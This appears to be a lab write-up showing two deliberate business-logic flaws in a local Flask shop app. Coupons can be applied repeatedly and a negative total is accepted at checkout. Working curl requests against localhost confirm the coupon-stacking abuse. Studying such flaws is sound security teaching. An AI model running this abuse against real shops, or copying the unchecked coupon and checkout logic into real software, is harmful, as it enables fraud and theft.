# Finding the Bug

## Flaw 1: Missing Deduplication in /coupon/apply

In `lab/app.py`:

```python
@app.route('/coupon/apply', methods=['POST'])
def apply_coupon():
    code = data.get('code', '').upper().strip()
    if code not in COUPONS:
        return jsonify({'error': 'Unknown coupon code'}), 400

    cart = get_cart()

    # Bug: no check for duplicate coupons
    coupon = COUPONS[code]
    discount = ...
    cart['price_cents'] -= discount
    cart['coupons_applied'].append(code)
```

The `coupons_applied` list is never checked before applying a new coupon. A coupon with code `FLAT5` can be applied 1000 times and each time it deducts $5 from the price.

## Flaw 2: No Price Validation in /checkout

```python
@app.route('/checkout', methods=['POST'])
def checkout():
    cart = get_cart()
    paid = cart['price_cents']
    # Bug: no validation -- paid can be negative
    balance = session.get('balance_cents', 0) - paid
    session['balance_cents'] = balance
```

The checkout endpoint subtracts `paid` from the user's balance. If `paid` is `-2500` (negative $25), the user's balance increases by $25.

## Confirming Flaw 1

```bash
CJAR=$(mktemp)
curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8095/coupon/apply \
    -H "Content-Type: application/json" \
    -d '{"code":"FLAT5"}'
# price: $95.00, coupons_applied: ["FLAT5"]

curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8095/coupon/apply \
    -H "Content-Type: application/json" \
    -d '{"code":"FLAT5"}'
# price: $90.00, coupons_applied: ["FLAT5", "FLAT5"]
```

The same coupon was accepted twice.

## Confirming the Path to Negative Prices

Apply FLAT5 20 times and the price reaches $0.00. Apply it once more and it becomes -$5.00. The endpoint never rejects this.
